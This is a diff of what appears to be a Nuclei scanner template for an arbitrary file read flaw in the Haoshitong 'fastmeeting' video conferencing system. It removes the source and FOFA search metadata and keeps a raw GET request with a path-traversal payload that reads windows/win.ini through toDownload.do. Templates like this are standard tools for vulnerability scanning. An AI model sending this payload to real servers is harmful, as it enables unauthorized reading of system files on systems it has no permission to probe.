@@ -3,12 +3,8 @@ info:
   name: 好视通视频会议系统 fastmeeting toDownload.do接口任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qhkzzpep1k7in4rs'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qhkzzpep1k7in4rs
-    fofa: app="好视通-视频会议"
 http:
 - raw:
   - 'GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
